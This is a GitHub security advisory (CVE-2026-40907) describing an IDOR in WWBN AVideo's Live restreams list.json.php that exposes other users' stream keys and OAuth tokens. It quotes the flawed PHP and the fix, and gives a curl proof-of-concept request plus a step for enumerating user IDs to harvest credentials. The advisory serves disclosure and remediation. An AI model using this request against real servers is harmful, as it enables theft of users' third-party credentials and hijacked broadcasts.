# [M] WWBN AVideo has an IDOR in Live Restreams list.json.php Exposes Other Users' Stream Keys and OAuth Tokens

## Summary
Severity: Medium
Advisory: GHSA-gpgp-w4x2-h3h7
CVE: CVE-2026-40907
CWE: CWE-639
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-gpgp-w4x2-h3h7
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The endpoint `plugin/Live/view/Live_restreams/list.json.php` contains an Insecure Direct Object Reference (IDOR) vulnerability that allows any authenticated user with streaming permission to retrieve other users' live restream configurations, including third-party platform stream keys and OAuth tokens (access_token, refresh_token) for services like YouTube Live, Facebook Live, and Twitch.

## Details

The authorization logic in `list.json.php` is intended to restrict non-admin users to viewing only their own restream records. However, the implementation at lines 10-14 only enforces this when the `users_id` GET parameter is absent:

```php
// plugin/Live/view/Live_restreams/list.json.php:6-19
if (!User::canStream()) {
    die('{"data": []}');
}

if (empty($_GET['users_id'])) {       // Line 10: only triggers when param is MISSING
    if (!User::isAdmin()) {
        $_GET['users_id'] = User::getId();  // Line 12: force to own ID
    }
}

if (empty($_GET['users_id'])) {
    $rows = Live_restreams::getAll();
} else {
    $rows = Live_restreams::getAllFromUser($_GET['users_id'], "");  // Line 19: attacker-controlled ID
}
```

When a non-admin user explicitly supplies `?users_id=<victim_id>`, the value is non-empty, so the override at line 12 is never reached. The attacker-controlled ID passes directly to `getAllFromUser()`, which executes:

```php
// plugin/Live/Objects/Live_restreams.php:90
$sql = "SELECT * FROM live_restreams WHERE users_id = $users_id";
```

This returns all columns from the `live_restreams` table, including:
- `stream_key` (VARCHAR 500) — the victim's RTMP stream key for third-party platforms
- `stream_url` (VARCHAR 500) — the RTMP ingest endpoint
- `parameters` (TEXT) — JSON blob containing OAuth credentials (`access_token`, `refresh_token`, `expires_at`) obtained via the restream.ypt.me OAuth flow

Other endpoints in the same directory correctly validate ownership. For example, `delete.json.php:19`:
```php
if (!User::isAdmin() && $row->getUsers_id() != User::getId()) {
    $obj->msg = "You are not admin";
    die(json_encode($obj));
}
```

This ownership check is missing from `list.json.php`.

## PoC

**Prerequisites:** Two user accounts — attacker (user ID 2, streaming permission) and victim (user ID 1, has configured restreams with third-party platform keys).

**Step 1:** Attacker authenticates and retrieves their session cookie.

**Step 2:** Attacker requests victim's restream list:
```bash
curl -s -b 'PHPSESSID=<attacker_session>' \
  'https://target.com/plugin/Live/view/Live_restreams/list.json.php?users_id=1'
```

**Expected response (normal behavior):** Empty data or error.

**Actual response:** Full restream records for user ID 1:
```json
{
  "data": [
    {
      "id": 1,
      "name": "YouTube Live",
      "stream_url": "rtmp://a.rtmp.youtube.com/live2",
      "stream_key": "xxxx-xxxx-xxxx-xxxx-xxxx",
      "parameters": "{\"access_token\":\"ya29.a0A...\",\"refresh_token\":\"1//0e...\",\"expires_at\":1712600000}",
      "users_id": 1,
      "status": "a"
    }
  ]
}
```

**Step 3:** Attacker can enumerate all user IDs (1, 2, 3, ...) to harvest all configured restream credentials across the platform.

## Impact

- **Credential theft:** Attacker obtains third-party platform stream keys and OAuth tokens (access_token, refresh_token) for all users who have configured live restreaming.
- **Unauthorized broadcasting:** Stolen RTMP stream keys allow the attacker to broadcast arbitrary content to the victim's YouTube, Facebook, or Twitch channels.
- **OAuth token abuse:** Stolen refresh tokens can be used to obtain new access tokens, providing persistent access to the victim's third-party accounts within the scope of the original OAuth grant.
- **Full enumeration:** User IDs are sequential integers, enabling trivial enumeration of all platform users' restream credentials.

## Recommended Fix

Add an ownership check in `list.json.php` consistent with the pattern used in `delete.json.php` and `add.json.php`:

```php
// plugin/Live/view/Live_restreams/list.json.php — replace lines 10-14
if (!User::isAdmin()) {
    $_GET['users_id'] = User::getId();
}
```

This unconditionally forces non-admin users to their own user ID, regardless of whether the `users_id` parameter was supplied. The `empty()` check should be removed so that the parameter cannot be used to bypass the restriction.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-gpgp-w4x2-h3h7
- https://nvd.nist.gov/vuln/detail/CVE-2026-40907
- https://github.com/WWBN/AVideo/commit/d5992fff2811df4adad1d9fc7d0a5837b882aed7
- https://github.com/WWBN/AVideo
